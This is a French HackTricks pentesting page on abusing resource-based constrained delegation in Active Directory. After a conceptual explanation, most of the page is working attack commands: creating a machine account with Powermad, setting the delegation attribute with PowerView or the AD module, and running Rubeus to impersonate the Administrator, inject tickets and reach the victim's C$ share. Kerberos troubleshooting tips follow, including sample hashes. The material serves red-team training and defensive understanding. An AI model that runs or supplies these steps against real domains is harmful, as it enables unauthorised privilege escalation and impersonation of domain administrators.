# Délégation restreinte basée sur les ressources

<details>

<summary><strong>Apprenez le piratage AWS de zéro à héros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres façons de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annoncée dans HackTricks** ou **télécharger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* Découvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) dépôts GitHub.

</details>

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

## Principes de base de la délégation restreinte basée sur les ressources

Cela est similaire à la [Délégation restreinte](constrained-delegation.md) de base mais **au lieu** de donner des autorisations à un **objet pour usurper n'importe quel utilisateur contre un service**. La délégation restreinte basée sur les ressources **définit dans l'objet qui peut usurper n'importe quel utilisateur contre lui**.

Dans ce cas, l'objet contraint aura un attribut appelé _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ avec le nom de l'utilisateur qui peut usurper tout autre utilisateur contre lui.

Une autre différence importante de cette Délégation restreinte par rapport aux autres délégations est que tout utilisateur avec des **permissions d'écriture sur un compte machine** (_GenericAll/GenericWrite/WriteDacl/WriteProperty/etc_) peut définir le _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ (Dans les autres formes de délégation, vous aviez besoin de privilèges d'administrateur de domaine).

### Nouveaux concepts

Dans la Délégation restreinte, il a été dit que le drapeau **`TrustedToAuthForDelegation`** à l'intérieur de la valeur _userAccountControl_ de l'utilisateur est nécessaire pour effectuer un **S4U2Self**. Mais ce n'est pas tout à fait vrai.\
La réalité est que même sans cette valeur, vous pouvez effectuer un **S4U2Self** contre n'importe quel utilisateur si vous êtes un **service** (avez un SPN) mais, si vous **avez `TrustedToAuthForDelegation`**, le TGS retourné sera **Transmissible** et si vous **ne l'avez pas**, le TGS retourné ne sera pas **Transmissible**.

Cependant, si le **TGS** utilisé dans **S4U2Proxy** n'est pas **Transmissible** en essayant d'abuser d'une **délégation restreinte de base**, cela **ne fonctionnera pas**. Mais si vous essayez d'exploiter une **délégation restreinte basée sur les ressources, cela fonctionnera** (ce n'est pas une vulnérabilité, c'est une fonctionnalité, apparemment).

### Structure de l'attaque

> Si vous avez des **privilèges équivalents en écriture** sur un **compte Ordinateur**, vous pouvez obtenir un **accès privilégié** sur cette machine.

Supposons que l'attaquant a déjà des **privilèges équivalents en écriture sur l'ordinateur victime**.

1. L'attaquant **compromet** un compte qui a un **SPN** ou **en crée un** ("Service A"). Notez que **n'importe quel** _Utilisateur Administrateur_ sans aucun autre privilège spécial peut **créer** jusqu'à 10 **objets Ordinateur (**_**MachineAccountQuota**_**)** et leur attribuer un **SPN**. Ainsi, l'attaquant peut simplement créer un objet Ordinateur et attribuer un SPN.
2. L'attaquant **abuse de son privilège d'ÉCRITURE** sur l'ordinateur victime (ServiceB) pour configurer une **délégation restreinte basée sur les ressources pour permettre à ServiceA d'usurper n'importe quel utilisateur** contre cet ordinateur victime (ServiceB).
3. L'attaquant utilise Rubeus pour effectuer une **attaque S4U complète** (S4U2Self et S4U2Proxy) de Service A à Service B pour un utilisateur **avec un accès privilégié à Service B**.
1. S4U2Self (à partir du compte compromis/créé avec SPN) : Demande un **TGS de l'Administrateur pour moi** (Non Transmissible).
2. S4U2Proxy : Utilise le **TGS non Transmissible** de l'étape précédente pour demander un **TGS** de l'**Administrateur** à l'**hôte victime**.
3. Même si vous utilisez un TGS non Transmissible, comme vous exploitez une délégation restreinte basée sur les ressources, cela fonctionnera.
4. L'attaquant peut **transmettre le ticket** et **usurper** l'utilisateur pour obtenir **accès au ServiceB victime**.

Pour vérifier le _**MachineAccountQuota**_ du domaine, vous pouvez utiliser:
```powershell
Get-DomainObject -Identity "dc=domain,dc=local" -Domain domain.local | select MachineAccountQuota
```
## Attaque

### Création d'un objet ordinateur

Vous pouvez créer un objet ordinateur à l'intérieur du domaine en utilisant [powermad](https://github.com/Kevin-Robertson/Powermad)**:**
```powershell
import-module powermad
New-MachineAccount -MachineAccount SERVICEA -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose

# Check if created
Get-DomainComputer SERVICEA
```
### Configuration de la **délégation contrainte basée sur les ressources**

**Utilisation du module PowerShell activedirectory**
```powershell
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount SERVICEA$ #Assing delegation privileges
Get-ADComputer $targetComputer -Properties PrincipalsAllowedToDelegateToAccount #Check that it worked
```
**En utilisant powerview**
```powershell
$ComputerSid = Get-DomainComputer FAKECOMPUTER -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer $targetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

#Check that it worked
Get-DomainComputer $targetComputer -Properties 'msds-allowedtoactonbehalfofotheridentity'

msds-allowedtoactonbehalfofotheridentity
----------------------------------------
{1, 0, 4, 128...}
```
### Réalisation d'une attaque S4U complète

Tout d'abord, nous avons créé le nouvel objet Ordinateur avec le mot de passe `123456`, donc nous avons besoin du hash de ce mot de passe :
```bash
.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local
```
Cela affichera les hachages RC4 et AES pour ce compte.\
Maintenant, l'attaque peut être effectuée :
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<aes256 hash> /aes128:<aes128 hash> /rc4:<rc4 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /domain:domain.local /ptt
```
Vous pouvez générer plus de tickets en ne demandant qu'une seule fois en utilisant le paramètre `/altservice` de Rubeus :
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<AES 256 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /domain:domain.local /ptt
```
{% hint style="danger" %}
Notez que les utilisateurs ont un attribut appelé "**Ne peut pas être délégué**". Si un utilisateur a cet attribut à True, vous ne pourrez pas vous faire passer pour lui. Cette propriété peut être vue dans bloodhound.
{% endhint %}

### Accès

La dernière ligne de commande effectuera **l'attaque S4U complète et injectera le TGS** de l'Administrateur vers l'hôte victime en **mémoire**.\
Dans cet exemple, un TGS pour le service **CIFS** a été demandé à l'Administrateur, vous pourrez donc accéder à **C$**:
```bash
ls \\victim.domain.local\C$
```
### Abus des différents tickets de service

Apprenez-en plus sur les [**tickets de service disponibles ici**](silver-ticket.md#available-services).

## Erreurs Kerberos

* **`KDC_ERR_ETYPE_NOTSUPP`**: Cela signifie que Kerberos est configuré pour ne pas utiliser DES ou RC4 et que vous fournissez simplement le hachage RC4. Fournissez à Rubeus au moins le hachage AES256 (ou fournissez simplement les hachages rc4, aes128 et aes256). Exemple : `[Rubeus.Program]::MainString("s4u /user:FAKECOMPUTER /aes256:CC648CF0F809EE1AA25C52E963AC0487E87AC32B1F71ACC5304C73BF566268DA /aes128:5FC3D06ED6E8EA2C9BB9CC301EA37AD4 /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:Administrator /msdsspn:CIFS/M3DC.M3C.LOCAL /ptt".split())`
* **`KRB_AP_ERR_SKEW`**: Cela signifie que l'heure de l'ordinateur actuel est différente de celle du contrôleur de domaine et que Kerberos ne fonctionne pas correctement.
* **`preauth_failed`**: Cela signifie que le nom d'utilisateur donné + les hachages ne fonctionnent pas pour se connecter. Vous avez peut-être oublié de mettre le "$" à l'intérieur du nom d'utilisateur lors de la génération des hachages (`.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local`)
* **`KDC_ERR_BADOPTION`**: Cela peut signifier :
  * L'utilisateur que vous essayez d'usurper ne peut pas accéder au service désiré (parce que vous ne pouvez pas l'usurper ou parce qu'il n'a pas assez de privilèges)
  * Le service demandé n'existe pas (si vous demandez un ticket pour winrm mais que winrm n'est pas en cours d'exécution)
  * Le fakecomputer créé a perdu ses privilèges sur le serveur vulnérable et vous devez les lui redonner.

## Références

* [https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html)
* [https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/](https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/)
* [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object)
* [https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/](https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/)

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

<details>

<summary><strong>Apprenez le piratage AWS de zéro à héros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres façons de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annoncée dans HackTricks** ou **télécharger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* Découvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** nous sur **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
